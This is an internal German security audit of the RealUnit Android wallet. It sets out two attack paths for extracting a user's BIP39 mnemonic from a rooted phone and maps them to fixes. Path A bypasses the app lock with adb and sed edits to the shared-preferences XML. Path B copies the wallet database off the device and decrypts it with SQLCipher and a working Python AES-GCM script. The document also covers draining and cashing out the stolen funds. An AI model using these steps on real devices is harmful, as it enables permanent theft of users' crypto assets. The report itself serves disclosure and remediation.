# RealUnit Mobile Wallet — Attack Chain NEW-1 + NEW-4

**Datum:** 2026-05-02
**Repository / Stand:** `DFXswiss/realunit-app` @ `develop` `8e87709`
**Bezug:** Follow-Up-Audit `docs/security-review-followup.md`, Findings NEW-1 und NEW-4
**Klassifikation:** Vertraulich, nur für interne Verwendung
**Status:** Pfad A am 2026-05-02 in Android-14-Emulator praktisch reproduziert (siehe Anhang A0).

> Dieses Dokument beschreibt den vollständigen Angriffspfad zum permanenten Verlust eines RealUnit-Wallets bei Phone-Diebstahl auf einem rootbaren oder forensisch zugänglichen Android-Gerät. Es dient ausschliesslich dazu, Entscheider und Implementierende zu befähigen, die Schwere und die Reihenfolge der notwendigen Fixes korrekt einzuschätzen. Die beschriebenen Schritte zielen ausschliesslich auf eine **eigene Test-Installation** des Wallets in einer kontrollierten Umgebung (Emulator oder Test-Device). Anwendung gegen fremde Installationen ist illegal.

---

## 1. Threat-Modell

**Angreifer-Profil:**
- Hat physischen Zugriff auf ein Android-Gerät, auf dem die RealUnit-App installiert ist und ein produktives Wallet konfiguriert ist.
- Typische Ausprägungen: Phone-Dieb, gefundene-Geräte-Verwerter, Empfänger eines „verkauften alten Phones" (Wipe wurde nicht zuverlässig durchgeführt), forensisches Lab, Insider mit Zugriff auf das ausgeschaltete Gerät eines Kollegen während der Mittagspause.

**Angreifer-Voraussetzungen — wichtige Einschränkung:**

Damit dieser Angriff praktisch durchführbar ist, muss eine der folgenden Bedingungen erfüllt sein:

- **Das Gerät ist bereits gerootet, bevor der Angreifer es in die Hand bekommt.** Typischerweise Power-User mit Magisk, Custom-ROM oder OEM-Unlocked Bootloader. Userdata bleibt erhalten, App-Datadir ist via `su` lesbar.
- **Der Angreifer hat Zugriff auf forensische Premium-Tools** (Cellebrite UFED, MSAB XRY, Oxygen Forensic Suite, GrayKey für iOS) und kann damit Userdata aus einem ausgeschalteten Gerät extrahieren.
- **Der Angreifer hat physischen Zugriff während die App läuft und nicht im Lockscreen ist** und kann Frida/Debugger anhängen — relevant in Insider-Szenarien.

**Praktisch nicht durchführbar gegen ein Stock-Phone vom Durchschnittsuser:**

Ein normaler User hat ein Phone mit gesperrtem Bootloader, Verified Boot, Hardware-Backed-Keystore. Wenn der Angreifer das Phone gestohlen hat und es vorher nicht rooted war, sind seine Optionen:

- `fastboot oem unlock` zwingt zu einem Userdata-Wipe — die Wallet-Daten werden dabei gelöscht. Der Angriff ist genau gegen die Daten gerichtet, die der Unlock zerstört. Pfad ist tot.
- Cellebrite/Forensik-Bypass funktioniert für ältere Android-Versionen oder spezifische Hardware-Vulnerabilities; auf aktuellen Pixel/Samsung-Knox-Geräten ist das nicht trivial verfügbar und kostet pro Extraktion 4- bis 5-stellige Beträge.
- Andere Hardware-Exploits sind realistisch nur für Strafverfolgung und Nation-State-Akteure.

**Wer ist also realistisch verwundbar:**

- Power-User mit bereits-rooted Phone: voll verwundbar.
- Custom-ROM-User: voll verwundbar.
- User mit OEM-Unlocked Bootloader, der Magisk/etc. installiert hat: voll verwundbar.
- Stock-Phone-User, dessen Phone in einem Forensik-Lab landet (Strafverfolgung, Versicherungs-Schadensregulierung mit Forensik-Auftrag, Reparatur-Werkstatt mit unethischem Personal): bedingt verwundbar, abhängig von der Hardware-Generation und den Tools.
- Stock-Phone-User mit zufällig gestohlenem Phone an einen technisch durchschnittlichen Dieb: weitgehend nicht verwundbar — der Dieb kommt nicht an die Daten ran, ohne sie zu zerstören.

**Angreifer-Wissen, das er nicht hat:**
- Den User-PIN.
- Den User-Biometric-Faktor (Fingerprint, FaceID).
- Die BIP39-Mnemonic-Phrase.

**Angreifer-Ziel:**
- Die BIP39-Mnemonic-Phrase exfiltrieren. Sobald er sie hat, kann er das Wallet auf einem beliebigen anderen Gerät / in einer beliebigen Wallet-Software importieren und alle Tokens transferieren. Der Diebstahl ist permanent — eine BIP39-Phrase kann nicht widerrufen werden, der ursprüngliche User hat dann zwar noch die gleiche Mnemonic, aber alle Werte sind bereits transferiert.

**Was nicht Teil des Threat-Modells ist:**
- Backend-Kompromittierung (das wäre NEW-16).
- MitM zwischen App und DFX-API (das wäre NEW-8).
- Social Engineering gegen den User (Phishing).
- Kompromittierung des User-iCloud/Google-Accounts (separat zu betrachten).

Dieser Angriffsvektor ist **vom DFX-Trust-Modell vollständig unabhängig** — der User vertraut DFX möglicherweise vollständig, das ändert aber nichts daran, dass ein Phone-Verlust auf einem **rootbaren Setup** zur Mnemonic-Exfiltration und damit zum Total-Loss der Wallet-Position führen kann.

Der RealUnit-Token (`0x553C7f9C780316FC1D34b8e14ac2465Ab22a090B`, Ethereum Mainnet) ist nach Auskunft des Issuers **frei übertragbar** — keine KYC-Whitelist auf Smart-Contract-Ebene. Damit entfällt eine theoretische Restriktion, die den Schaden begrenzt hätte. Der Angreifer kann nach erfolgreicher Mnemonic-Exfiltration die RealUnit-Tokens direkt an seine eigene Adresse transferieren und über DEX-Liquidity (sofern vorhanden) oder OTC monetarisieren.

---

## 2. Architektur-Verständnis

Bevor der Angriff Sinn ergibt, hier die relevanten Speicherorte auf einem Standard-Android-Gerät mit installierter App.

### App-Datadir
```
/data/data/swiss.realunit.app/
```
Dieses Verzeichnis ist im Standardbetrieb nur für den App-eigenen UID lesbar (`run-as swiss.realunit.app` als die App), oder für root.

### Relevante Dateien im Datadir

| Pfad | Inhalt | Sensitivität |
|---|---|---|
| `shared_prefs/FlutterSharedPreferences.xml` | App-Lock-Flags: `isPinEnabled`, `pinFailedAttempts`, `pinLockedUntil`, sonstige App-Settings | **Klartext-XML, manipulierbar** |
| `shared_prefs/FlutterSecureStorage.xml` | Encrypted-Storage: `wallet.mnemonic.encryption.key`, `drift.encryption.password`, `pin.hash`, `pin.salt` | RSA-encrypted, RSA-Key im AndroidKeyStore |
| `app_flutter/wallet.db.enc` | SQLCipher-DB mit Wallet-Info-Tabelle (Spalte `seed` enthält AES-GCM-encrypted BIP39-Mnemonic) | SQLCipher-encrypted |

### Kryptographische Schichten um die Mnemonic

```
BIP39-Mnemonic (Klartext)
        │
        ▼
AES-GCM-Encryption mit Schlüssel aus FlutterSecureStorage["wallet.mnemonic.encryption.key"]
        │
        ▼
gespeichert als TEXT-Spalte `seed` in Tabelle `WalletInfos`
        │
        ▼
SQLCipher-Encryption mit Schlüssel aus FlutterSecureStorage["drift.encryption.password"]
        │
        ▼
DB-File `wallet.db.enc` auf der Disk
```

### App-Lock-Schicht (separat von der Mnemonic-Encryption)

```
User-PIN (6 Digits)
        │
        ▼
PBKDF2-HMAC-SHA256 (10'000 Iterationen, 16-Byte-Salt)
        │
        ▼
gespeichert als `pin.hash` + `pin.salt` in FlutterSecureStorage

Zusätzlich:
isPinEnabled=true/false in FlutterSharedPreferences (Klartext-XML)
pinFailedAttempts (Counter) in FlutterSharedPreferences
pinLockedUntil (DateTime) in FlutterSharedPreferences
```

### Relevante Code-Pfade

- `lib/packages/repository/settings_repository.dart:46-79` — Lockout-Flags in SharedPreferences
- `lib/screens/pin/bloc/auth/pin_auth_cubit.dart:22-30` — App-Lock-Initialisierung
- `lib/main.dart:103-125` — Routing basierend auf PIN-State
- `lib/screens/pin/bloc/setup_pin/setup_pin_cubit.dart:64-72` — PIN-Setup überschreibt alten Hash
- `lib/packages/storage/secure_storage.dart:14, 75-98` — Mnemonic-Encryption-Key-Handling
- `lib/packages/repository/wallet_repository.dart:13, 31-38` — Encrypt/Decrypt-Aufrufe
- `lib/packages/storage/database.dart:75-90` — SQLCipher-Setup mit `pragma key`

---

## 3. Angriffspfad A — App-Lock-Reset (einfach, kein Crypto-Wissen nötig)

Dies ist der Pfad, den ein durchschnittlich technischer Phone-Dieb mit Root-Zugriff durchführen kann, ohne Verständnis von Krypto oder Wallet-Internals.

### Voraussetzung
- adb-Zugriff mit root (`adb shell`, dann `su`), oder Bootloader-Unlock + TWRP.

### Schritt-für-Schritt

**Schritt 1 — App killen, BEVOR die XML angefasst wird**

`SharedPreferences` werden auf Android in-memory gecacht und asynchron auf Disk geschrieben. Wenn die App noch läuft, wenn der Angreifer die XML editiert, kann der App-Prozess die Memory-Werte später zurückschreiben und die Manipulation überschreiben. Daher zuerst:

```bash
adb shell
su
am force-stop swiss.realunit.app
cd /data/data/swiss.realunit.app/shared_prefs/
```

**Schritt 2 — App-Lock-Flag inspizieren**

```bash
cat FlutterSharedPreferences.xml
```

Erwartete Zeile (gekürzt):
```xml
<boolean name="flutter.isPinEnabled" value="true" />
```

(Hinweis: Das `shared_preferences`-Flutter-Plugin prefixt alle Keys mit `flutter.` — der Code-seitige Key `'isPinEnabled'` wird zu `flutter.isPinEnabled` in der XML.)

**Schritt 3 — Flag manipulieren**

```bash
sed -i 's|<boolean name="flutter.isPinEnabled" value="true" />|<boolean name="flutter.isPinEnabled" value="false" />|' FlutterSharedPreferences.xml
```

Optional auch Lockout-Counter zurücksetzen, falls schon Versuche stattgefunden haben:
```bash
sed -i '/flutter.pinFailedAttempts/d; /flutter.pinLockedUntil/d' FlutterSharedPreferences.xml
```

Hinweis: Das `sed`-Pattern-Matching ist anfällig für Whitespace-Varianten zwischen Android-Versionen. Robusteres Vorgehen wäre via Python mit XML-Parser. Für die Demonstration reicht `sed` aber.

**Schritt 4 — App starten**

Über die UI normal antippen, oder:
```bash
am start -n swiss.realunit.app/.MainActivity
```

Effekt durch den Code-Pfad in `pin_auth_cubit.dart:22-30`:
```dart
final isPinSetup = _settingsRepository.isPinEnabled;  // false aus geänderter XML
emit(state.copyWith(
  isPinSetup: isPinSetup,           // false
  isPinVerified: !isPinSetup,        // true (!)
));
```

In `main.dart:116-117` greift dann:
```dart
} else if (!pinState.isPinSetup) {
  targetRoute = PinRoutes.setup;
}
```

→ Die App routet auf den **PIN-Setup-Screen** statt auf den App-Lock-Verify-Screen. Kein bestehender PIN wird abgefragt.

**Schritt 6 — Neuen PIN setzen**

Auf dem PIN-Setup-Screen wählt der Angreifer einen neuen PIN, z.B. `123456`. `setup_pin_cubit.dart:64-72`:

```dart
Future<void> _confirmPin(String confirmPin) async {
  if (confirmPin == _createPin) {
    final salt = SecureStorage.generatePinSalt();
    final hash = SecureStorage.hashPin(confirmPin, salt);
    await Future.wait([
      _secureStorage.setPinSalt(salt),    // überschreibt original-Salt
      _secureStorage.setPinHash(hash),    // überschreibt original-Hash
    ]);
    _settingsRepository.isPinEnabled = true;
    emit(state.copyWith(isComplete: true));
  }
}
```

→ Der ursprüngliche PIN-Hash wird überschrieben. Der legitime User kann sich nach dem Angriff nicht mehr mit seinem alten PIN einloggen (Denial-of-Service-Nebeneffekt).

**Architektur-Detail — `_appStore.wallet` ist bereits gesetzt:**

Wichtig zu verstehen: Das Wallet wird **nicht erst nach** dem PIN-Setup geladen, sondern **schon beim App-Start** durch `HomeBloc._onLoadCurrentWallet` (`home_bloc.dart:46-81`). `_appStore.wallet = wallet;` (Zeile 60) wird ausgeführt, bevor irgendein PIN-State geprüft ist. Der gesamte Decrypt-Pfad läuft also schon durch, bevor der PIN-Setup-Screen überhaupt angezeigt wird. Was der Angreifer im PIN-Setup tut, ist nur der Schritt, der den `main.dart:_navigate()`-Router weiterlaufen lässt. Das Wallet selbst, inklusive entschlüsselter Mnemonic im Memory, ist seit App-Start aktiv.

**Schritt 6b — Optional: Biometric-Prompt überspringen**

Nach `setup_pin_page.dart:37-44` wird `_promptBiometricSetup` aufgerufen, das fragt, ob Biometric aktiviert werden soll. Der Angreifer wählt „Ablehnen" oder cancelt den Geräte-Biometric-Prompt — `_biometricService.enable()` returnt `false`, kein Fehler wird geworfen, der Flow setzt fort mit `getIt<PinAuthCubit>().onPinSetupComplete()`.

**Schritt 7 — App-Routing zum Dashboard**

`PinAuthCubit.onPinSetupComplete()` emittiert `(isPinSetup: true, isPinVerified: true)`. Der `BlocListener<PinAuthCubit>` in `main.dart:91-95` triggert `_navigate()` — alle Bedingungen (`softwareTermsAccepted`, `openWallet != null`, `onboardingCompleted`, `isPinSetup`, `isPinVerified`) sind erfüllt → `targetRoute = AppRoutes.dashboard`.

Der Wallet-Loading-Code in `wallet_service.dart:39-50` ruft `_repository.getWalletById(id)`, was in `wallet_repository.dart:20-25` den Decrypt-Pfad triggert (war bereits beim App-Start gelaufen, hier nur zur Erläuterung der NEW-4-Schwäche):

```dart
Future<WalletInfo?> getWalletById(int id) async {
  final info = await _appDatabase.getWalletById(id);
  if (info == null) return null;
  if (info.seed.isEmpty) return info;
  return _decryptWalletInfo(info);     // ← decrypt ohne User-Auth
}
```

`_decryptWalletInfo` ruft `_secureStorage.getOrCreateMnemonicKey()` — dieser Call gibt den AES-Key zurück, **ohne dass eine User-Bestätigung nötig wäre**. Das ist NEW-4.

→ Die App lädt das Original-Wallet vollständig (Original-Mnemonic, Original-Address, Original-Balance) und zeigt es im Dashboard.

**Schritt 8 — Mnemonic anzeigen**

Settings → „Backup Wallet" → Step-up-PIN (mit dem **neu** vom Angreifer gesetzten PIN, weil der Original-Hash überschrieben wurde) → SettingsSeed-Screen zeigt die BIP39-Mnemonic.

`settings_seed_view.dart:21` aktiviert zwar `NoScreenshot.instance.screenshotOff()` (FLAG_SECURE), aber:
- Der Angreifer kann die Worte einfach abschreiben oder mit einer zweiten Kamera abfotografieren.
- FLAG_SECURE schützt nur gegen System-Screenshots, nicht gegen visuelle Erfassung.
- Auf rooted Device kann FLAG_SECURE per Frida-Hook umgangen werden:
  ```bash
  frida -U -l no_flag_secure.js -f swiss.realunit.app
  ```

**Schritt 9 — Mnemonic in Angreifer-Wallet importieren**

In MetaMask, Rabby, Frame, MyEtherWallet — beliebige Wallet-Software, die BIP39 + BIP44-Path `m/44'/60'/0'/0/0` unterstützt.

→ Permanenter Wallet-Zugriff.

**Schritt 10 — Funds transferieren**

- **RealUnit-Tokens:** Frei übertragbar (keine On-Chain-Whitelist), direkter `transfer()` an die Angreifer-Adresse möglich. **Total-Loss der RealUnit-Position.**
- **Andere ETH-basierte Assets:** ETH (für Gas-Reserven), beliebige andere ERC-20-Tokens, NFTs auf derselben Adresse — ebenfalls frei transferierbar.
- **Off-Ramp:** RealUnit-Tokens via DEX (sofern Liquidity vorhanden) oder OTC; andere Assets standard via Uniswap → ETH → CEX-Adresse, kein KYC-Zwang auf DEX-Ebene.
- **Cross-App-Schaden:** Wenn der User dieselbe BIP39-Mnemonic in anderen Wallets verwendet hat (MetaMask, Rabby, etc.), sind diese ebenfalls kompromittiert. Bei Power-Usern mit Single-Seed-Setup hoher Schaden, bei Standard-Usern mit App-spezifischer Mnemonic kein zusätzlicher Vektor.
- **Indirekter Schaden:** Authentifizierung gegenüber DFX-API als der User möglich (NEW-17 persistierte Signatur) — Sell mit ggf. fake-IBAN, falls das Backend keine IBAN-Whitelist gegen KYC-Daten enforce.

**Total Time:**
- Bei vorab-rooted Device: 15-30 Minuten.
- Bei Stock-Phone, das erst gerooted werden muss: praktisch nicht durchführbar, weil Bootloader-Unlock userdata wiped (siehe Threat-Modell-Einschränkung in Abschnitt 1).
- Forensische Premium-Extraktion: Stunden bis Tage, abhängig von Hardware-Generation und Tooling.

---

## 4. Angriffspfad B — Forensische DB-Extraktion (ohne PIN-Reset)

Ein subtilerer Pfad, der den User nicht aussperrt (kein DoS-Nebeneffekt) und damit unauffälliger ist. Nützlich, wenn der Angreifer das Phone wieder zurückgeben will — etwa in einem Reparatur-Lab oder in einer Insider-Situation.

### Voraussetzung
- Root oder forensische Tools.
- Wissen über die Krypto-Pfade (dieses Dokument).

### Schritte

**Schritt 1 — Daten exfiltrieren**

```bash
adb shell
su
cd /data/data/swiss.realunit.app/

# DB-File
cp app_flutter/wallet.db.enc /sdcard/wallet.db.enc

# FlutterSecureStorage XML
cp shared_prefs/FlutterSecureStorage.xml /sdcard/FSS.xml

exit; exit

adb pull /sdcard/wallet.db.enc .
adb pull /sdcard/FSS.xml .
```

**Schritt 2 — FlutterSecureStorage-Werte entschlüsseln**

`FlutterSecureStorage.xml` enthält key-value-Paare, wobei die Values mit dem RSA-Key aus dem AndroidKeyStore verschlüsselt sind. Das Key-Material liegt im Hardware-Keystore und ist non-exportable.

**Aber:** Der Angreifer braucht den Key nicht zu extrahieren. Er kann ihn _verwenden_, sobald er mit Frida-Server (als root) in den App-Prozess injizieren kann. Standard-Forensik-Vorgehen:

1. Frida-Server als root auf dem Device starten (`./frida-server &`).
2. App starten (auch ohne Login bis zum Splash-Screen reicht — der Plugin-Code wird beim ersten FSS-Read geladen).
3. Frida-Skript ausführen, das die FlutterSecureStorage-Plugin-Methoden hookt und Klartext-Reads dumped.

```javascript
// extract_secure_storage.js — schematisch
Java.perform(function() {
  var FSSPlugin = Java.use('com.it_nomads.fluttersecurestorage.FlutterSecureStoragePlugin');
  // Hook die Read-Methode, die nach RSA-Decrypt den Klartext zurückgibt,
  // und logge Key + Klartext-Value.
});
```

Was technisch **nicht** geht: Eine separate Angreifer-App mit eigenem Package-Namen, die unter `run-as` als die RealUnit-App auftritt — `run-as` funktioniert nur für Apps mit `android:debuggable="true"`, das ist bei Production-Builds nicht der Fall. Der Angreifer braucht entweder Root + Frida, oder eine Cellebrite-ähnliche Premium-Forensik-Pipeline.

Ergebnis: Der Angreifer hat im Klartext:
- `wallet.mnemonic.encryption.key` — 32 Bytes Base64
- `drift.encryption.password` — 64 Hex-Chars
- `pin.hash`, `pin.salt` — irrelevant für diesen Pfad

**Schritt 3 — SQLCipher-DB lokal entschlüsseln**

Auf dem Laptop des Angreifers:

```bash
sqlcipher wallet.db.enc
sqlite> PRAGMA cipher_compatibility = 4;
sqlite> PRAGMA key = "<drift.encryption.password>";
sqlite> SELECT name, seed FROM WalletInfos;
```

Ergebnis: Eine Zeile pro Wallet, `seed` ist das AES-GCM-encrypted Mnemonic im Format `<base64-iv>:<base64-ciphertext>`.

**Schritt 4 — Mnemonic entschlüsseln**

Triviales Python-Script mit `cryptography`:

```python
import base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

key = base64.b64decode("<wallet.mnemonic.encryption.key>")
iv_b64, ct_b64 = "<seed-from-db>".split(":")
iv = base64.b64decode(iv_b64)
ct = base64.b64decode(ct_b64)

mnemonic = AESGCM(key).decrypt(iv, ct, None).decode("utf-8")
print(mnemonic)
```

→ BIP39-Mnemonic im Klartext.

**Schritt 5+ — Wallet importieren, Funds transferieren**

Wie in Pfad A.

**Vorteil dieses Pfads für den Angreifer:**
- Der User merkt nichts. Sein PIN funktioniert weiterhin, App-Lock ist intakt, Mnemonic-Anzeige im Settings funktioniert. Erst wenn er sein Wallet öffnet und die Balance prüft, sieht er den Verlust.
- Falls die Funds noch nicht transferiert wurden, kann der Angreifer das Phone in Ruhe zurückgeben und später zuschlagen.

---

## 5. Warum keine bestehende Schutzmassnahme greift

| Schutzmassnahme | Wirksamkeit gegen diesen Angriff |
|---|---|
| **PIN (6 Digits)** | Pfad A: Wird neu gesetzt, alter Hash überschrieben. Pfad B: Komplett umgangen. |
| **Biometric (Fingerprint/FaceID)** | `local_auth` gibt nur einen `bool` zurück, ist nicht an den Mnemonic-Key gebunden (NEW-5). Pfad A: Angreifer setzt Biometric ggf. neu. Pfad B: Komplett umgangen. |
| **SQLCipher-DB-Encryption** | Schlüssel liegt in FlutterSecureStorage, ohne User-Auth-Gate verwendbar (NEW-4). |
| **Mnemonic-AES-GCM-Encryption (Audit-Fix für 4.1)** | Schlüssel liegt im selben Trust-Anchor (FlutterSecureStorage), ohne User-Auth-Gate verwendbar. Effektiv kosmetisch. |
| **FLAG_SECURE / NoScreenshot** | Pfad A: Mit Frida-Hook umgehbar; ausserdem visuelle Erfassung möglich. Pfad B: Irrelevant. |
| **`allowBackup="false"` im Manifest** | Schützt vor `adb backup`. Schützt nicht vor direktem Filesystem-Zugriff via Root. |
| **PIN-Lockout (5/6/7/8 min Throttling)** | Counter in SharedPreferences, manipulierbar (NEW-1). Pfad A: Komplett umgangen, weil neuer PIN gesetzt wird. |
| **Step-up-PIN vor Seed-Reveal** | Pfad A: Neuer PIN funktioniert für den Step-up. Pfad B: Komplett umgangen. |
| **Android-Hardware-Backed-Keystore** | Schützt das Key-_Material_ vor Extraktion, aber nicht die Key-_Verwendung_ aus dem App-Sandbox-Kontext. Mit run-as oder Frida nutzt der Angreifer den Schlüssel ohne ihn extrahieren zu müssen. |

**Es gibt keinen verbleibenden kryptographischen Backstop, der den Angreifer aufhält, sobald er Code-Ausführung im App-Sandbox erreicht hat.**

---

## 6. Wie ein NEW-4-Fix den Angriff stoppen würde

Die Empfehlung aus dem Audit (4.1) und aus dem Follow-Up (NEW-4) ist:

**Den Mnemonic-Encryption-Key im Android-Keystore mit `setUserAuthenticationRequired(true)` und `setInvalidatedByBiometricEnrollment(true)` generieren, und Decrypt-Operationen über einen `BiometricPrompt.CryptoObject(cipher)` gaten.**

Effekt auf die beiden Angriffspfade:

### Pfad A nach NEW-4-Fix

Schritt 7 (`getOrCreateMnemonicKey()` ohne Auth) würde fehlschlagen — der Keystore-Key wäre nur nach erfolgreicher Biometric-Authentifizierung verwendbar. Der Angreifer wird mit dem System-BiometricPrompt konfrontiert, der seinen Fingerprint/sein Gesicht abfragt — der ist ihm nicht bekannt. Auch der Geräte-PIN-Fallback ist ihm nicht bekannt (das ist der Lockscreen-PIN, nicht der App-PIN, den er gerade neu gesetzt hat).

→ Wallet-Daten bleiben verschlüsselt im Speicher, App kann nicht ins Dashboard, Mnemonic nicht abrufbar.

### Pfad B nach NEW-4-Fix

In Schritt 4 (lokales Entschlüsseln) würde der Angreifer feststellen, dass der `wallet.mnemonic.encryption.key`-Eintrag in FlutterSecureStorage gar nicht existiert — der Mnemonic-Key liegt direkt im Android-Keystore, nicht in FSS. Um den Key zu nutzen, muss er im App-Kontext laufen UND einen Biometric-Prompt erfolgreich beantworten.

→ Auch ohne Phone-Manipulation und mit kompletter DB-Extraktion bleibt die Mnemonic verschlüsselt.

### Was NEW-4 NICHT alleine löst

- Der Angreifer kommt immer noch in die App rein (NEW-1 ist nicht behoben). Er sieht das Dashboard mit Balance.
- Aber: Ohne Decrypt-Möglichkeit für den Mnemonic kann er die Tokens nicht transferieren (Signing braucht den Mnemonic). Die App müsste bei jedem Transfer den Biometric-Prompt zeigen.
- D.h. der schlimmste Schaden (permanenter Total-Loss via Mnemonic-Exfiltration) ist verhindert. Es bleibt höchstens ein „App-Browse-Access" für den Angreifer — unangenehm, aber nicht finanziell katastrophal.

### Was NEW-1-Fix zusätzlich bringt

Wenn Lockout-State und `isPinEnabled` in SecureStorage liegen statt in SharedPreferences:
- Pfad A Schritt 3 (`isPinEnabled = false`) funktioniert nicht mehr — der Angreifer kann den App-Lock nicht trivial bypassen.
- Er müsste den PIN tatsächlich erraten, was mit korrektem Lockout auf 9 Versuche begrenzt ist.
- **Realistische Erfolgsrate:** Bei mathematisch gleichverteilten 6-Digit-PINs $9/10^6 \approx 0{,}001\%$. Real folgen PINs aber bekannten Mustern (Geburtstag, `123456`, `000000`, `111111`, `654321`, Auto-Sequenzen). Studien zu 4- und 6-Digit-PINs zeigen, dass die Top-10-PINs typischerweise 5–15% aller PINs abdecken. Bei 9 gezielten Versuchen mit Top-PIN-Liste ist die Erfolgsrate also realistisch 5–15% — nicht 0,001%.
- Praktische Konsequenz: NEW-1-Fix macht Pfad A deutlich schwieriger, schliesst ihn aber nicht hermetisch. Eine zusätzliche Massnahme wäre Lockscreen-PIN-Strength-Hinweis bei Wallet-Setup ("verwenden Sie keine Geburtstage / Sequenzen") oder Mindestlängen-Erzwingung > 6 Stellen.

→ Pfad A ist nach NEW-1 deutlich entschärft, aber nicht trivial geschlossen.

### Beide Fixes kombiniert

- Pfad A: Stark entschärft durch NEW-1 (PIN-Bruteforce statt trivialer XML-Edit). Falls PIN ohnehin gut gewählt, faktisch geschlossen.
- Pfad B: Auch nach NEW-4-Fix bleibt der Angreifer im Sandbox-Kontext der App und kann mit Frida den Biometric-Prompt versuchen — aber er hat den Fingerprint des Users nicht, und der Geräte-PIN-Fallback ist der Lockscreen-PIN, den er auch nicht hat.
- Theoretisch offen für Premium-Forensik mit TEE-Bypass (Cellebrite mit aktuellen Exploits, GrayKey, Nation-State-Tooling). Diese Tools sind nicht öffentlich verfügbar und richten sich an Strafverfolgung; relevant für ein Threat-Modell „RealUnit-Holder wird Subjekt einer Strafverfolgungs-Aktion mit forensischer Hardware-Extraktion", aber nicht für „Phone wird in der Bahn gestohlen".
- Hardware-backed Keystore mit User-Auth-Gating ist der industrielle Standard für Banking-Apps in der Schweiz (e.g. UBS, Twint, Swissquote-App) und gilt als ausreichend gegen alle nicht-staatlichen Angreifer.

→ Nach beiden Fixes ist die App auf einem Sicherheitsniveau, das mit etablierten Schweizer Banking-Apps vergleichbar ist.

---

## 7. Praktische Demonstration in einer kontrollierten Umgebung

Zum Verifizieren des Angriffs in einem internen Test-Setup:

### Setup
1. Android-Emulator (Android Studio AVD) mit Android 14, x86_64, Google APIs **NICHT** Google Play (Play-Images blockieren root via Verified Boot).
2. RealUnit-App debug-build installieren oder Beta-APK sideloaden.
3. Wallet erstellen, PIN setzen (z.B. 654321), Mnemonic notieren.
4. Test-Tokens auf der Adresse minten (Sepolia-Testnet, NetworkMode auf Testnet umstellen).

### Pfad A reproduzieren
Schritte aus Abschnitt 3 nachvollziehen.

### Pfad B reproduzieren
Schritte aus Abschnitt 4 nachvollziehen. SQLCipher CLI nötig:
```bash
brew install sqlcipher  # macOS
```

### Erwartetes Ergebnis
In Pfad A: Nach Schritt 8 wird genau die Mnemonic angezeigt, die in Schritt 3 des Setups notiert wurde.
In Pfad B: Nach Schritt 4 entschlüsselt das Python-Script genau diese Mnemonic.

---

## 8. Schadensbewertung

### Direkter finanzieller Schaden

- **RealUnit-Token-Position: Total-Loss.** Der Token ist nach Auskunft des Issuers frei übertragbar — keine KYC-Whitelist auf Smart-Contract-Ebene, die einen Drain stoppen würde. Der Angreifer transferiert die Position nach erfolgreicher Mnemonic-Exfiltration direkt an eine eigene Adresse. Monetarisierung über DEX-Liquidity (sofern vorhanden) oder OTC.
- **Andere ETH-basierte Assets auf derselben Adresse:** ETH (Gas-Reserven), beliebige andere ERC-20-Tokens, NFTs — alle frei transferierbar, alle drainbar.
- **Cross-Wallet-Schaden:** Wenn der User dieselbe BIP39-Mnemonic in anderen Wallets verwendet (Power-User-Setup mit Single-Seed über mehrere Apps), sind diese ebenfalls kompromittiert. Bei Standard-Usern mit App-spezifischer Mnemonic kein zusätzlicher Vektor.

### Indirekter Schaden

- **Privacy-Verlust:** KYC-Daten in der DB (sofern dort gespeichert), persistierte Auth-Signatur (NEW-17), Wallet-History.
- **DFX-API-Authentifizierung:** Mit der persistierten Signatur (NEW-17) kann der Angreifer sich gegenüber dem DFX-Backend als der User authentifizieren. Konkrete Auswirkung hängt vom Backend-Verhalten ab:
  - IBAN-Whitelist gegen KYC: nicht eigenständig geprüft. Falls vorhanden, kann der Angreifer keine Sells an eigene IBAN auslösen. Falls nicht, ist auch der Sell-Vektor offen.
  - Auth-Token-Lifecycle: ebenfalls nicht eigenständig geprüft. Wenn die Signatur serverseitig nicht zeitlich gebunden ist, gilt sie unbegrenzt.

### Aggregiert

- Anzahl betroffener User × durchschnittliche Wallet-Position.
- Da RealUnit ein tokenisierter Wertpapier-Token ist (Long-Term-Holding-Profil, keine Spekulations-Volumen), sind im Mittel mittlere bis grössere Beträge zu erwarten — kein Cents-Stake-Spielzeug-Wallet.
- Pro Vorfall: vollständiger Verlust der Wallet-Position des Users.

### Reputations-/Compliance-Aspekt

- Ein publizierter Phone-Diebstahl-zu-Drain-Fall in den Schweizer Medien ist für eine FINMA-relevante AG erheblich. Die Story „App lässt Mnemonic exfiltrieren" reicht für Schaden-Narrativ, unabhängig vom konkreten Einzelbetrag.
- Ein bekannt werdender systematischer Bug via Reddit/Twitter eines Reverse-Engineers kann zur breiten Welle führen.
- Ein vorhandenes internes Audit-Dokument (dieses hier) hilft bei der Klärung der Frage „war die Schwachstelle bekannt" — sowohl für Schadenersatz als auch für D&O-Versicherung.

---

## 9. Zusammenfassung

**Was technisch belegt ist:**
- Auf einem **bereits-rooted Android-Gerät** kann ein Angreifer mit physischem Zugriff in 15–30 Minuten via SharedPreferences-Edit + neuer PIN den App-Lock bypassen und die Mnemonic via Settings-Seed-Reveal exfiltrieren. Das ist Pfad A.
- Auf einem rooted Gerät mit Frida-Server kann der Angreifer alternativ über DB-Extraktion + In-Process-Hook auf FlutterSecureStorage die Mnemonic exfiltrieren ohne die App-UI zu touchen. Das ist Pfad B.
- Hauptursachen sind NEW-1 (Lockout-State in SharedPreferences) und NEW-4 (Mnemonic-Encryption-Key ohne User-Auth-Gating). Beide sind im aktuellen Code des `develop`-Branches offen.

**Was wichtig zu relativieren ist:**
- Gegen ein **Stock-Phone** mit gesperrtem Bootloader und aktiver Verified Boot 2.0 (Default-Auslieferungszustand aktueller Pixel/Samsung-S-Reihe-Geräte) ist Pfad A nicht trivial durchführbar — Bootloader-Unlock zwingt zu Userdata-Wipe, was die zu stehlenden Daten zerstört.
- Auf Geräten anderer Brands (Xiaomi, OnePlus, Realme, ältere Samsung, etc.) ist Bootloader-Unlock teilweise ohne Wipe oder über Drittpartei-Tools möglich. Hier gilt der Stock-Phone-Schutz nicht universell.
- Realistisch verwundbar sind primär: Power-User mit pre-rooted Devices, Custom-ROM-User, User mit Mid-Range-Brands ohne strikte Verified-Boot-Erzwingung, Forensik-Setups in Strafverfolgung/Reparatur-Lab/Versicherungs-Schadensregulierung.

**Schadenshöhe pro betroffenem User:**
- RealUnit-Token ist frei übertragbar — Total-Loss der RealUnit-Position bei erfolgreicher Mnemonic-Exfiltration.
- Plus alle anderen ETH-basierten Assets auf derselben Adresse.
